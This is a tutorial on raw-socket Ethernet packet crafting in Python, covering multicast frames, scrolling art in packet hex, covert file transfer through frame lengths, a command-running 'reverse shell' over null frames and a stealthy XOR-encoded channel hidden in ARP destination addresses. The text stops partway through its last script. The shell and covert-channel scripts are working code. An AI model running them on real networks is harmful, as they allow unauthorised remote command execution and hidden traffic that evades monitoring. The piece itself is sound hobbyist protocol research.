# Packets Remystified: Broadcast Brujería

![image](https://user-images.githubusercontent.com/26436276/163653070-ad74a443-e0c1-4a29-9f59-1b9f20d3064e.png)

## Introduction

Packet analysis and other networking tasks are often given a bad rep as something difficult to approach, intimidating.

There are many reasons for this. Personally, the hardest thing was getting through the many layers of abstraction and loosely compatible jargon that are used to describe and implement the simple act of sending a few pulses down the wire to your loved ones.

I wanted to write something to help cut through all of this, and give you the knowledge required to understand different ways of sending data. We will also explore ways to inject some magic back into everything.

For this writeup, I am using some Linux VMs, Python3, and Wireshark. No other fancy tools or libraries will be needed. All scripts will need to be run as root, so please keep that in mind and use a VM if you don't feel comfortable. You will want to be able to run Wireshark on at least two machines on the same network for this.

## Briefly: How Do Packets Get From Here To There?

When you clicked this link, your browser split your request into smaller chunks, and passed them to your operating system via a socket. The OS then figured out what it wanted to do with the data, and decided to send it to your network interface.

Before it could, the request data needed to be *encapsulated*. All this means is that a header is added to the data to assist in sending it to the correct location. Imagine wrapping a present and putting a label on it, and then wrapping that in more gift wrap with a different label. Here’s a diagram of how a payload gets wrapped in layers, and what the layers can be:

![image](https://user-images.githubusercontent.com/26436276/163653102-f0d32489-5192-469a-a438-70c33736f73b.png)

Once the encapsulation was finished, the interface then received the data. The interface then sent the required electrical signals representing the request packet to your router for further processing.

When the response containing the page contents was received, the router sent the packets to your machine. The process then happened again, but in reverse.

To process a packet, the OS figures out what driver is required to handle it. This can then lead to multiple levels of de-encapsulation before it finally gets back to your browser. Because this whole process is handled by drivers and kernel code, it allows users and applications to not have to worry about the details of the socket too much. This aids in developing network applications without having to reimplement all of the layers to support a given packet.

Non-root users can open certain types of sockets arbitrarily. The limited number of types give the OS control over the TCP/IP or UDP/IP layers. To control these and other, lower layers, you need to be able to create RAW sockets.

*For more info on sockets, check out the man pages for [socket(2)](https://man7.org/linux/man-pages/man2/socket.2.html) and [socket(7)](https://man7.org/linux/man-pages/man7/socket.7.html)*

One advantage to using raw sockets is that you don't need an OS level driver to handle packets for you. You are simply handed the entire frame to do what you want. The downside is needing root privs or special [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html).

## **Briefly: How Do Packets Get From Here To Everywhere?**

Sometimes a device needs to send data to every host on the network, or groups of hosts. This is used for discovering other devices, getting information about the network, and advertising your goods and services. Protocols that can be used to talk to multiple devices at once are called multicast protocols. To use a multicast protocol, your client needs to send a packet to the router, which then sends a copy to everyone.

How does the router know what to forward though? Let's take a look at the [Ethernet](https://en.wikipedia.org/wiki/Ethernet) header, which is the first 14 bytes of most packets you will see in Wireshark.

![image](https://user-images.githubusercontent.com/26436276/163653133-f67f47b8-1dbd-4df9-8755-da2a960423ed.png)

The bottom bit of the first byte of the eth.dst field, also known as the IG bit, is what's used to inform the router what type of frame is being sent. If this bit is set to 1, the router is supposed to forward the frame to everyone. You can use the Wireshark filter eth.dst.ig == 1 to see all of the multicast packets your computer has received.

## What multicast protocols are there?

Multicast protocols are actually quite common. If you open up Wireshark on your main network interface with the filter `eth.dst.ig == 1`, you will see things like:

| Protocol | Protocol Stack | Description |
| --- | --- | --- |
| [ARP](https://datatracker.ietf.org/doc/html/rfc826) | Ethernet/ARP | Address Resolution Protocol. Used to negotiate IPs on a network. |
| [MDNS](https://datatracker.ietf.org/doc/html/rfc6762)  | Ethernet/IP/UDP/MDNS | Multicast DNS. |
| [SSDP](https://datatracker.ietf.org/doc/html/draft-cai-ssdp-v1-03) | Ethernet/IP/UDP/SSDP | Simple Service Discovery Protocol. Used to share information about running services. |
| [IGMP](https://datatracker.ietf.org/doc/html/rfc2236) | Ethernet/IPv4/IGMP | Internet Group Management Protocol, used to manage multicast groups. |
| LLDP | Ethernet/LLDP | Link Layer Discovery Protocol, used to broadcast info about a device to network peers. |

Many multicast protocols use UDP and/or IP for transport. Since the packet is going to everyone, there is no need for the handshakes used by TCP/IP. When a protocol does use IP specifically, there are a number of multicast IP addresses that protocols can use. Some are tied to specific protocols, while others are generic ranges. There are also special multicast Ethernet addresses as well, which some routers may treat differently.

- For IPv4: [https://www.iana.org/assignments/multicast-addresses/multicast-addresses.xhtml](https://www.iana.org/assignments/multicast-addresses/multicast-addresses.xhtml)
- For IPv6: [https://www.iana.org/assignments/ipv6-multicast-addresses/ipv6-multicast-addresses.xhtml](https://www.iana.org/assignments/ipv6-multicast-addresses/ipv6-multicast-addresses.xhtml)
- Wikipedia: [https://en.wikipedia.org/wiki/Multicast_address](https://en.wikipedia.org/wiki/Multicast_address)

Other multicast protocols, such as ARP and LLDP, are purely Ethernet based, with their own ethertype. The [ethertype](https://en.wikipedia.org/wiki/EtherType) is one of the key pieces of info required to indicate how to process a given frame.

We use Ethernet protocols like ARP to figure out what IP addresses belong to who. Since the IP is generally known only by the router, to find out where to send IP based packets to, there needs to be a way to determine that on a lower network level. 

Let’s take a look at an ARP packet. This one is an ARP request for the MAC address associated with the IP 10.0.1.11, asking to return the info to 10.0.1.10.

![image](https://user-images.githubusercontent.com/26436276/163653193-a3c78746-2944-409a-a773-d991573a6f77.png)

The first byte of `eth.dst` has the IG bit set. This is because the hex value 0xFF is all 1’s in binary. With the IG bit set, this message is forwarded by the router to everyone on the network. A device that knows what IP address is associated with that MAC address can respond. *(Technically [anyone can respond](https://en.wikipedia.org/wiki/ARP_spoofing) lol)*

## **How can we send multicast messages?**

Lets try to send our own ARP message using Python. There are many ways to do this, but this approach gives you the most control and only relies on the [socket](https://docs.python.org/3/library/socket.html) library. First, you'll need your entire packet represented as bytes.

> PROTIP: In wireshark, you can right click on the frame and select "Copy>As Escaped String" to give you strings for use in scripts.
> 

All we need to create a raw socket is to use the Python3 socket library with the appropriate flags to set up a raw socket. Then we `bind()` to the interface, and `send()` our buffer of escaped bytes to it.

You will need to change to the interface you want to send data over. You can use the command `ip a` to get a list of interfaces, MAC addresses, and IPs associated with your machine.

```python
from socket import *

interface = "eth0" # Change to your interface

# //- Ethernet Header
pkt =  b""
pkt += b"\xff\xff\xff\xff\xff\xff" # eth.dst
pkt += b"\x00\x11\x22\x33\x44\x55" # eth.src
pkt += b"\x08\x06"                 # eth.type (ARP)
# //- ARP Message
pkt += b"\x00\x01"                 # arp.hw.type        -- Hardware Type: Ethernet
pkt += b"\x08\x00"                 # arp.proto.type     -- Protocol Type: IPv4
pkt += b"\x06"                     # arp.hw.size        -- Hardware Size: 6
pkt += b"\x04"                     # arp.proto.size     -- Protocol Size: 4
pkt += b"\x00\x01"                 # arp.opcode         -- Opcode: Request
pkt += b"\x00\x11\x22\x33\x44\x55" # arp.src.hw_mac     -- Source MAC Address
pkt += b"\x0a\x00\x01\x0a"         # arp.src.proto_ipv4 -- Source IP: 10.0.1.10
pkt += b"\x00\x00\x00\x00\x00\x00" # arp.dst.hw_mac     -- Target MAC Address
pkt += b"\x0a\x00\x01\x0b"         # arp.dst.proto_ipv4 -- Target IP: 10.0.1.11

s = socket(AF_PACKET, SOCK_RAW)
s.bind((interface, 0))
s.send(pkt)
```

Save the script as arpsend.py and run

```
$ sudo python3 arpsend.py
```

Then check the output in Wireshark.

![image](https://user-images.githubusercontent.com/26436276/163653212-8115c90c-d209-4d83-a189-4d239d312071.png)

Now that we know how to send a raw frame and understand what multicast protocols are, lets see what else we can do!

# Entering the Magic Circle

The next part of this writeup comes with a few important pieces of information.

While writing this article, the scripts I developed were tested primarily on my laptop with two Linux VMs in VMware. With virtual machines, you can usually set up networking using a virtual interface. This can provide a way to send packets from your VM to the internet, and can also be used to create a virtual network that acts the same way as the network your host machine is on. Some of the examples here were developed with an extremely permissive interface, `vmnet`. This interface doesn’t have the same processing logic as other routers do, and throughout the writing of this article, I found that the behavior is actually quite finicky between router models. These differences will be recorded throughout the writeup.

All scripts that rely on a permissive router will have the suffix `_MIN` to indicate that it uses the minimum required features.

## wall'd Garden

You might be thinking: What happens if you just send some random bytes to the router? Let's find out! First, comment out everything except the Ethernet header in the arpsend script and run it.

![image](https://user-images.githubusercontent.com/26436276/163653231-277df8c8-e3f6-4a47-a632-88e9ca8dfd30.png)

The Ethernet header was sent, but nothing else! Wireshark was expecting the rest of the ARP packet because the `eth.type` was set to ARP, so it hit an error when it didn’t get the rest of the data. 

We know that the first byte of the frame is important for the router, but what if we just put our own message after?

```python
from socket import *

interface = "ens33" # Change to your interface

# //- Ethernet Header
pkt =  b""
pkt += b"\xffhowdy" # eth.dst
pkt += b" hello"    # eth.src
pkt += b"!!"        # eth.type

s = socket(AF_PACKET, SOCK_RAW)
s.bind((interface, 0))
s.send(pkt)
```

Run the script and check Wireshark.

![image](https://user-images.githubusercontent.com/26436276/163653249-08b90563-0cf1-422c-820b-0a77435f2b70.png)

Our frame made it! We are only on our local version of Wireshark, do other computers see this too? Let's check out another VM on the same network as our host machine. Listen with Wireshark the other VM on the same virtual network and then run the script again.

![image](https://user-images.githubusercontent.com/26436276/163653256-a5f8b78c-5593-423b-a80a-ee2600ca9a31.png)

The data was received, but now it has some extra padding at the end. An Ethernet II packet is supposed to have a 46 byte payload, plus the 14 byte header, resulting in a 60 byte packet. This is why the length here is 60 rather than 14, because the interface is receiving it from a remote host.

This was originally done to ensure that there was a minimum amount of signal on the wire to sense if a host was transmitting. This is part of the "Carrier Sense" aspect of [CSMA-CD](https://en.wikipedia.org/wiki/Carrier-sense_multiple_access_with_collision_detection), an early Ethernet implementation. This was also used for collision detection, the CD part of that acronym.

Okay so now what? We can transmit pretty much anything as long as the lowest bit of the first byte is 1. What else can we send?

The easiest thing would be to just append a bunch of data after the first byte, kind of like a network-wide `wall` command. Since we are re-mystifying packets, lets make it interesting...

## Scrolling Art

A while back I wrote a script to create a Wireshark based [scroller](https://www.youtube.com/watch?v=QwSudydjRXc) within the hex dump of a packet. This relied on the packet structure and url remaining consistent, which is not always the case. If we did the same thing using an Ethernet protocol, it's more likely to be preserved, as well as take up the entire packet for a more menacing effect.

```python
from socket import *

interface = "ens33" # Your network interface

art = [
  b"                                            *  ** **  *************   **  *                                      ",
  b"                              ** **   ** **##*****###**#**###*****     *,     **      **                         ",
  b"                                 **  ******##@@@@@@@@@@@@@@@@####*##** **  *  ** **   **          Y R B H B N    ",
  b"                           . *,     *. ***###@@@@@@@@@@@@@@@@@@@@@@@@###*/*/**,.*,*****    .      O O E A Y E    ",
  b"                          *  ** **   ****#@@@    @@@@@@@@@@@@@@@@     @@@@#**##*##**********      U U E U   T    ",
  b"                           ,,  *. *****###%&      %&@@@@@@@@@@&&        @@@%#*/#**((*  ***,,      R T N N   S    ",
  b"                          *****#**#####@@@          @@@@@@@@            @@@@@@@#@@***###            E   T   P    ",
  b"                  ,,. , .,,.,,**/((//#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#%@((((/##            R   E   O    ",
  b"                      *  ** **##*##**#@@@@@@@@@@@@@@@@@@@@@@@@@@@@##@@@@@@@@@@@@@#####*****         '   D   O    ",
  b"                    ***  *****#(*#(@@#@@@@@@@@###(*****           (#@@@@@@@@@@@@@@@###**#*****      S       K    ",
  b"                       **  *****#**##@@@@@@@@@@@##***            #@@@@###@@@@@@@@@@###******* **            Y    ",
  b"                       ****#@@@@@##@@@@@@@@@@@@@@@@##        ##@@@####@@@@@@@@##@@@@@#**#**                      ",
  b"                      *  **#@@@@@@@##@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@@@@#@@@@#(#*****                    ",
  b"                      ***##@@@@@@@@@@@##@@@@@@@@@@@@@@@@@@@@@@@##@@@@@@@@@@@@@@@@@@@@##(***  *                   ",
  b"                    ** ##@@@@@@@@@@@@@##@@@@@@@@@@@@@@@@@@@@@@@##@@@#(@@@@@@@@@@@##@@#**#****                    ",
  b"                       ** ##@@@@@@@@@@@@@@@##@@@@@@@@@@@@@@@@@@@@@##@##@@@##@@@@@###@@#####***                   ",
  b"                         *##@@#@@@@@(#@@@@@##@@@@@@@@@@@@@@@@@@@@@##@##@@@##@@@@@##@@@@@###*                     ",
  b"                *  ***##@@#@@@@#@@@@###@@@@@@@@@@@@@@@@@@@@@@@@@#@@##@@@##@@@##@@@##*##***                       ",
  b"                  *****##@@#@@@@#@@@@#@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@##@@@##@##@@@##**#** **                      ",
  b"                  **   *****####*##**#####@@@@@@@@@@@@@@@@@@@@@@@@@@@@###@@@@@@@###**#**                         ",
  b"                      *  ** ****#*******##@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@###*****  *                        ",
  b"                        **      ****#**#(###@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@###**##***                          ",
  b"                               *  ***##**####@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@###**#**   **                     ",
  b"                   ** **  *       ***##*****######@@@@@@@@@@@@@@@@@@@@@@@@@@@@@######** ****                     ",
  b"                 ,,..,..**.*****....******((*((###@@&&&&&@@@@@@@@@@@@@@@@@@@@@@@##//(,,,                         ",
  b"                     *,**************    ****(#**(########(@@@@@@@@@@@@@@@@@@@@@###(#**#                         ",
  b"                   ,,.,,**,****,**,,*,,..*//(//((/((//(((**#((##&@@@@@@@@@@@@@@@@@%%###/**,,                     ",
  b"                      ,*       *  ** **********##*(#**#*****((**###@@@@@@@@@@@@@@@@@####**                       ",
  b"                   ..,               ..,...,*.,*******,**,,***((/(/###((%%#&&%%&%%&&%//(..  ,                    ",
  b"                                       ** ** ****     *  ** *******************###@@#***(#                       ",
  b"                                            .                        .  .,...   ,.**%//*.....                    "
]

def sendData(inData,inSock):
    framee = b"\x01"
    framee += b"NETWORK ERROR!!"
    framee += inData 
    inSock.send(framee)

x = 0  # The starting point in the scroll
y = 16 # End of screen

s = socket(AF_PACKET, SOCK_RAW)
s.bind((interface, 0))

for i in range(len(art[0])):
  out = b""
  for l in range(len(art)):
    out += art[l][x:y]
  sendData(out,s)
  x = x+1 # Increment start
  y = y+1 # Increment end
  if y == len(art[0]):
    break
```

Run the script and then check what was sent in Wireshark by scrolling down the list of captured packets. Run it on a monitored network to make a sysadmin laugh (or cry).

POC Video: [https://twitter.com/netspooky/status/1509230930011033608](https://twitter.com/netspooky/status/1509230930011033608)

On a lot of real world routers, this sort of thing won’t work, because the destination MAC address may be processed differently (we will get to that later). For now, this same effect can be achieved by simply using the universal broadcast MAC which is `FF:FF:FF:FF:FF:FF` in the `sendData` function. Your mileage may vary, so modify the script to make it work on your network.

```python
def sendData(inData,inSock):
    framee =  b"\xFF\xFF\xFF\xFF\xFF\xFF" # eth.dst
    framee += b"\x42\x4f\x4f\x21\x21\x21" # eth.src
    framee += b"\x00\x00" # eth.type
    framee += inData 
    inSock.send(framee)
```

## 0x01 and Done

So we can send art and animations over the wire, but maybe we could be a bit more mystifying? What if we transmitted the same byte at different lengths to encode data?

A tiny encoder for our multicast protocol could be implemented quite simply. Just take the value of each byte of data, and multiply the number of bytes being transmitted. On the receiving end, you can just reverse that process. Since we have to account for the minimum frame size, you could just add or subtract that on either end. The minimum is 60, but using 64 bytes of base padding makes it look nice and tidy.

Here's a simple way to implement this.

Server:

```python
from socket import *
import sys

# ZEROETH_MIN.PY - Simple null frame transport over ethernet
# Run:
# $ cat file | sudo python3 zeroeth_min.py
# On the remote computer:
# $ sudo python3 zeroeth_min.client.py

interface = "vmnet8" # Your network interface
message = sys.stdin.buffer.read()

def getHeader():
    # Some routers, OSes, and other things a packet may pass through have issues with small 
    # frames that don't have a designated ethernet type. This header basically ensures that
    # at least 64 bytes is sent per frame.
    #
    # Minimal Ethernet Frame Layout
    #
    #         ┌dst──────────────┬src──────────────┬type─┐
    #   0000: └01─00─00─00─00─00┴00─00─00─00─00─00┴00─00┘00 00
    #   0010:  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    #   0020:  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    #   0030:  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    # 
    # As long as the lowest bit of the eth.dst field is set to 1, the packet is multicast.

    data =  b"\x01" # eth.dst multicast
    data += b"\x00" * 63 # The rest is just padding.
    return data

def sendData(inData,inSock):
    framee =  getHeader()
    framee += b"\x00" * inData # Creates a frame with null bytes that add up to the bytes value
    inSock.send(framee)

s = socket(AF_PACKET, SOCK_RAW)
s.bind((interface, 0))

for i in message:
    sendData(i,s)
```

Client:

```python
import socket
import time

# ZEROETH_MIN.CLIENT.PY - Simple null frame transport over ethernet listener for ZEROETH
# Run:
# $ sudo python3 zeroeth_min.client.py
# On the remote computer:
# $ cat file | sudo python3 zeroeth_min.py

s = socket.socket( socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
timeout = time.time() + 10 # Time limit for listener

while time.time() < timeout:
    try:
        packet  = s.recvfrom(65565) # The buffer
        packet  = packet[0]     # Our packet
        ethtype = packet[12:14] # The ethernet type

        if ethtype == b"\x00\x00": # Match the ethernet type
            decodedpkt = len(packet) - 0x40
            print("{}".format(chr(decodedpkt)), end="")
    except Exception as e:
        print(e)
```

To use it, just cat a file into the server script and listen with the client.

```
Server:
$ cat myfile.txt | sudo python3 zeroeth_min.py
Client:
$ sudo python3 zeroeth_min.client.py
```

The client will decode the frames, which allows you to transfer files to everyone on the network. Neat!

POC Video of older and slower version: [https://twitter.com/netspooky/status/1487515781483188236](https://twitter.com/netspooky/status/1487515781483188236)

This minimal version probably won’t work on your home router, so you can use a similar approach as the scroller script to have a stable interface

In the server, you can change the `getHeader` function to:

```python
def getHeader():
    data =  b"\xFF\xFF\xFF\xFF\xFF\xFF" # eth.dst multicast
    data += b"\x5a\x45\x5a\x45\x5a\x45" # eth.src
    data += b"\x5a\x45" # eth.type
    data += b"\x00" * 50 # The rest is just padding.
    return data
```

In the client, you can change the `ethtype` check to:

```python
    if ethtype == b"\x5a\x45": # Match the ethernet type
```

Using an ethertype of something other than 0x0000 might also help get the packets transmitted. Worst case scenario: Reuse an ethertype of another protocol and see what happens.

This script is in the repo as zeroeth.py

![image](https://user-images.githubusercontent.com/26436276/163653283-3f3895d0-3abe-45dd-9622-d7159c222d67.png)

## Reverse Shell

A file transfer broadcast is awesome, but what if we wanted to do two way communication? This takes a little bit more planning, but can it be done! Let's say we have multiple hosts that want to send message to each other, and want to separate their communications so they don't confuse each other. How do we ensure delivery to the right hosts?

For starters, we will want to indicate how data is supposed to be processed. The most basic way to indicate the data type is similar to how [FTP handles data types](https://knowledge.broadcom.com/external/article/28212/ftp-ascii-vs-binary-mode-what-it-means.html), with a selector for either ASCII or Binary data.

Because this whole protocol is going to have no concept of connections, or even a source, we will also need a way to differentiate data streams and determine when they end. All of this can be accomplished by using the first byte of the frame as a bit field for our protocol.

We can make the top bit the selector for the data type. If 1, it's binary data, otherwise, it's ASCII. Then the flag to indicate that the stream is over can come after. If set to 1, then the packet is the last message in the transmission and the data stream is finished.

Lastly, we can have a source and destination encoded here. We can use 2 bits for each, because there is an uneven number of bits left to use. In total we can have 4 hosts addressable at any time.

The encoding of the first byte of `eth.dst` now looks like this:

![image](https://user-images.githubusercontent.com/26436276/163653307-c61f65b0-d38c-4489-ad66-3759d92d455c.png)

As a fun demo, we can also turn this entire thing into a reverse shell. All we need to do for that on a server level is to just grab the data buffer from the command, run it, and send the output back.

This is what the server looks like:

```python
from socket import *
import subprocess
# ZEROETH_ROUTING_MIN.PY
interface = "ens33" # Your network interface
nodeaddr = 1 # Range is 0 through 3

def sendData(inData,inSock,isLast,dstNode):
    baseByte = 1 # This sets the multicast bit
    srcNode  = nodeaddr << 2 # This is where our node address goes
    dstNode  = dstNode << 4 # This is who we are sending to
    baseByte = baseByte | srcNode
    baseByte = baseByte | dstNode
    framee = b""
    if isLast:
      baseByte = baseByte | 0x40
    framee += baseByte.to_bytes(1,'big')
    framee += b"\x00" * 63 # The rest is just padding.
    framee += b"\x00" * inData # Creates a frame with null bytes that add up to the bytes value
    inSock.send(framee)

def encodeMessage(inData, inSock, dstNode):
    endchar = 0
    for i in inData:
        sendData(i,inSock,0,dstNode)
    sendData(endchar,inSock,1,dstNode)

def getAsciiChar(inData):
    decodedpkt = len(inData) - 0x40
    return chr(decodedpkt)

def runCmd(inCmd):
    inCmdList = inCmd.split()
    inCmdList.pop()
    out = subprocess.run(inCmdList, capture_output=True)
    #print(out.stdout)
    return out.stdout

# Receive
r = socket(AF_PACKET, SOCK_RAW, ntohs(0x0003))
# Transmit 
t = socket(AF_PACKET, SOCK_RAW)
t.bind((interface, 0))

databuf = ""

while True:
    # What we need for our message
    packet = r.recvfrom(65565)
    packet = packet[0]
    byte0  = packet[0] # The very first byte 
    ethtype = packet[12:14] # We want to check if this is our type
    if ethtype == b"\x00\x00":
        # Check the first byte now to see if it's multicast
        if byte0 & 1:
            #if byte0 & 0x80:
            #    bindata = 1 # Check the mode, this isn't implemented yet
            dst = byte0 & 0x30 # This preserves bits 5 and 6
            dst = dst >> 4     # Turn this into a value
            src = byte0 & 0x0C # This preserves bits 3 and 4
            src = src >> 2     # Turn this into a value
            if dst == nodeaddr: # This is for us
                #print("DST: {} SRC: {}".format(dst, src))
                decodedpkt = len(packet) - 0x40
                databuf += chr(decodedpkt)
                if byte0 & 0x40:
                    cmdOut = runCmd(databuf)
                    encodeMessage(cmdOut,t,src)
                    databuf = ""
```

The client needs to be able to both take input from the user on the command line, and encode / decode data. Here's what that looks like:

```python
from socket import *
import time
import sys
# ZEROETH_ROUTING_MIN.CLIENT.PY
interface = "ens33" # Change to your interface
nodeaddr = 0 # Range is 0 through 3
srvaddr = 1 # This is who we are sending data to
timeOut = 3 # Need this so we can ensure all the data comes back from the server

def sendData(inData,inSock,isLast,dstNode):
    baseByte = 1 # This sets the multicast bit
    srcNode  = nodeaddr << 2 # This is where our node address goes
    dstNode  = dstNode << 4 # This is who we are sending to
    baseByte = baseByte | srcNode
    baseByte = baseByte | dstNode
    framee = b""
    if isLast:
      baseByte = baseByte | 0x40
    framee += baseByte.to_bytes(1,'big')
    framee += b"\x00" * 63 # The rest is just padding.
    framee += b"\x00" * inData # Creates a frame with null bytes that add up to the bytes value
    inSock.send(framee)

def encodeMessage(inData, inSock, dstNode):
    endchar = 0
    for i in inData:
        sendData(i,inSock,0,dstNode)
    sendData(endchar,inSock,1,dstNode)

def decodeMessage(inSock):
  decodeTimeout = time.time() + timeOut # Time limit for listener
  outbuf = ""
  
  while time.time() < decodeTimeout:
      try:
          packet  = inSock.recvfrom(65565) # The buffer
          packet  = packet[0]     # Our packet
          byte0   = packet[0] # The very first byte 
          ethtype = packet[12:14] # The ethernet type
  
          if ethtype == b"\x00\x00": # Match the ethernet type
              # Check the first byte now to see if it's multicast
              if byte0 & 1:
                  #if byte0 & 0x80:
                  #    bindata = 1 # Check the mode - Not implemented yet
                  dst = byte0 & 0x30 # This preserves bits 5 and 6
                  dst = dst >> 4     # Turn this into a value
                  src = byte0 & 0x0C # This preserves bits 3 and 4
                  src = src >> 2     # Turn this into a value
                  if dst == nodeaddr: # This message is for us
                    decodedpkt = len(packet) - 0x40
                    outbuf += chr(decodedpkt)
                  if byte0 & 0x40:
                      print(outbuf)
                      outbuf = ""
      except Exception as e:
        print()

# Receive
r = socket( AF_PACKET, SOCK_RAW, ntohs(0x0003))
r.settimeout(timeOut)
# Transmit
t = socket(AF_PACKET, SOCK_RAW)
t.bind((interface, 0))

while True:
    for line in sys.stdin:
        if 'exit' == line.rstrip():
            break
        encodeMessage(line.encode('latin-1'),t,srvaddr) # Sending data
        decodeMessage(r)
```

Both servers need to have sockets for sending and receiving. A challenge here is waiting to read from the socket for the right amount of time. Because of how fast this is, it's important to try to synchronize the process well. My easy way around this was to just set a timeout on the receive socket for the client of 3 seconds, which allows all the data to be processed. We can improve on this strategy later on.

POC Video: [https://twitter.com/netspooky/status/1508977218046865416](https://twitter.com/netspooky/status/1508977218046865416)

## ashes2ashes, dst2dst

Null frames are fun, but to the more curious analyst, this might be somewhat strange. The frames could be dropped for a variety of reasons. Using custom ethertypes and sending one packet per byte is very noisy too. How can we make our comms look a bit more subtle? 

Since we are using multicast, we can still rely on the bottom bit being 1. There are 12 bytes of MAC address space we can use for whatever, minus that one bit. We could also use the eth.type field too, but if we want to make it usable with other legit multicast protocols, we should leave it be.

If you’re piggybacking off of an existing protocol, how do you indicate to other hosts that the protocol is being tunneled? It might make sense to add some routing features like in zeroeth, but there's another way I want to share that is useful in many other types of protocol designs.

Here's a rundown of the parsing logic:

- Check the ethertype
- Use the first byte as a XOR key to decrypt the rest of the data
- Use a checksum to validate what was sent
- If it passes this check, process the transmitted data

To make this as easy as possible, let's just use `eth.dst` for the data, and leave the source as is. There's other complex scenarios for opcodes, stream tracking, and other bells and whistles, but for now we can just do something simple.

![image](https://user-images.githubusercontent.com/26436276/163653325-086b6d41-60a0-4a0d-9e72-82e60a89c813.png)

If your goal is stealth, then it's useful to do something like a rolling XOR to encode data. Something that always bothered me was people using a single byte XOR key to encrypt every given byte. When you do this, it’s quite easy to spot repeating characters and looks sloppy. A rolling XOR means that the key is modified in some way each time, obfuscating the pattern.

This encoding scheme is straight forward.

- Generate a random 8 bit number. This will be the base of your XOR key.
- OR it with 1 to ensure that the bottom bit is set
- Create a checksum by adding the contents of the data chunk to itself, modulo 256 to keep it from being larger than 1 byte.
- XOR the key with the checksum and put that in the second byte of `eth.dst`
- XOR the first byte of the data with the XOR’d checksum, and add the checksum (modulo 256 again to wrap to 1 byte)
- Continue by xoring a byte with the previous byte and adding the checksum to it.

This creates a different `eth.dst` every time, without much computational overhead. It also creates an easy way to check for data without accidentally processing legit packets. Because of how limited our space is, there's nothing to indicate what the padding is here. This sort of protocol might be most useful for text based data. You could also try to leverage some other aspects of the data within or beyond the message body of the protocol you are piggybacking off of to communicate things like padding, opcodes, data type etc. That's up to you!

To demonstrate, we can reuse the ARP message structure for a legit type of packet to implement this on top of.

This is the full script:

```python
import threading
from socket import *
import sys
import argparse
import random
import binascii

interface = "eth0" # Change to your interface

parser = argparse.ArgumentParser(description='dst2dst')
parser.add_argument('-m', dest='inMac', help='This is the source mac you will use')

# Transmit
t = socket(AF_PACKET, SOCK_RAW)
t.bind((interface, 0))
# Receive
r = socket( AF_PACKET, SOCK_RAW, ntohs(0x0003))
msgBufz = {} # These are buffers for tracking messages

def getChecksum(inData):
    b = inData[0]+inData[1]+inData[2]+inData[3]
    c = b % 256
    return c

def encodeMessage(inData):
    # What we are generating
    # ┌─eth.dst───────┐
    # 01 02 03 04 05 06
    # │  │  └─────────┴ XOR'd Data
    # │  └───────────── Checksum - Sum of the data bytes, which is XOR'd with the Key
    # └──────────────── XOR Key
    msgSeed = random.randrange(0,256)
    msgSeed = msgSeed | 1 # Ensure the bottom bit is always set
    msgBuf  = b""
    csum = getChecksum(inData)
    msgBuf += bytes([msgSeed])        # eth.dst[0]
    msgBuf += bytes([msgSeed ^ csum]) # eth.dst[1]
    msgBuf += bytes([( ( msgBuf[1] + csum ) % 256 ) ^ inData[0]]) # eth.dst[2]
    msgBuf += bytes([( ( msgBuf[2] + csum ) % 256 ) ^ inData[1]]) # eth.dst[3]
    msgBuf += bytes([( ( msgBuf[3] + csum ) % 256 ) ^ inData[2]]) # eth.dst[4]
    msgBuf += bytes([( ( msgBuf[4] + csum ) % 256 ) ^ inData[3]]) # eth.dst[5]
    return msgBuf

def decodeMessage(inData,esrc):
    # What we are decoding
    # ┌─eth.dst───────┐
    # 01 02 03 04 05 06
    # │  │  └─────────┴ XOR'd Data
    # │  └───────────── Checksum - Sum of the data bytes, which is XOR'd with the Key
    # └──────────────── XOR Key
    csum = inData[0] ^ inData[1]
    msgBuf = b""
    msgBuf += bytes([( ( inData[1] + csum ) % 256 ) ^ inData[2]])
    msgBuf += bytes([( ( inData[2] + csum ) % 256 ) ^ inData[3]])
    msgBuf += bytes([( ( inData[3] + csum ) % 256 ) ^ inData[4]])
    msgBuf += bytes([( ( inData[4] + csum ) % 256 ) ^ inData[5]])
    calcSum = getChecksum(msgBuf)
    # If the checksums match, we should print!
    if csum == calcSum:
        if esrc not in msgBufz.keys():
            msgBufz[esrc] = msgBuf
        else:
            msgBufz[esrc] += msgBuf
        if b"\x00" in msgBuf:
            print("{} -- {}".format(esrc, msgBufz[esrc].decode()))
            msgBufz[esrc] = b""

def rcv_message(inSock):
    while True:
        # What we need for our message
        packet = r.recvfrom(65565)
        packet = packet[0]
        ethdst  = packet[0:6]
        ethsrc  = packet[6:12].hex(':')
        ethtype = packet[12:14] # We want to check if this is our type
        if ethsrc == inMac:
            continue
        if ethtype == b"\x08\x06":
            decodeMessage(ethdst,ethsrc) # Attempt to decode

def genMessage(inData,inSock,srcMac):
    # //- Ethernet Header
    pkt =  b""
    pkt += encodeMessage(inData)
    pkt += srcMac
    pkt += b"\x08\x06"                 # eth.type (ARP)
    # //- ARP Message
    pkt += b"\x00\x01"                 # arp.hw.type        -- Hardware Type: Ethernet
    pkt += b"\x08\x00"                 # arp.proto.type     -- Protocol Type: IPv4
    pkt += b"\x06"                     # arp.hw.size        -- Hardware Size: 6
    pkt += b"\x04"                     # arp.proto.size     -- Protocol Size: 4
    pkt += b"\x00\x01"                 # arp.opcode         -- Opcode: Request
    pkt += b"\x00\x11\x22\x33\x44\x55" # arp.src.hw_mac     -- Source MAC Address
    pkt += b"\x0a\x00\x01\x0a"         # arp.src.proto_ipv4 -- Source IP: 10.0.1.10
    pkt += b"\x00\x00\x00\x00\x00\x00" # arp.dst.hw_mac     -- Target MAC Address
    pkt += b"\x0a\x00\x01\x0b"         # arp.dst.proto_ipv4 -- Target IP: 10.0.1.11
    
    inSock.send(pkt)

def send_message(inSock,srcMacS):
    srcMac = binascii.unhexlify(srcMacS.replace(':',''))
    for line in sys.stdin:
        msg = line.rstrip()
        msg = msg.encode('latin-1')
        padding = (len(msg) % 4) # Using this to calculate how many padding bytes are needed
